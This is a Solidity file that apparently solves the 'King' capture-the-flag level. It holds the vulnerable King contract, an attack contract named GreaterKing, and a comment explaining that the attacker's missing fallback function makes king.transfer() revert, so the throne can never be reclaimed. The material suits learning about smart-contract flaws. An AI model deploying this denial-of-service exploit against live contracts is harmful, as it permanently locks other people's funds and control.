pragma solidity ^0.4.18;

import 'browser/ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

contract GreaterKing{
    
    
    function GreaterKing() public {
        
    }
    
    function becomeKing(address _king) public payable{
        _king.call.value(msg.value)();
    }
    
}

// Trick here is that the calling contract doesn't have the fallback function.
// That causes the function "king.transfer()" to revert and nobody can reclaim kinship from you.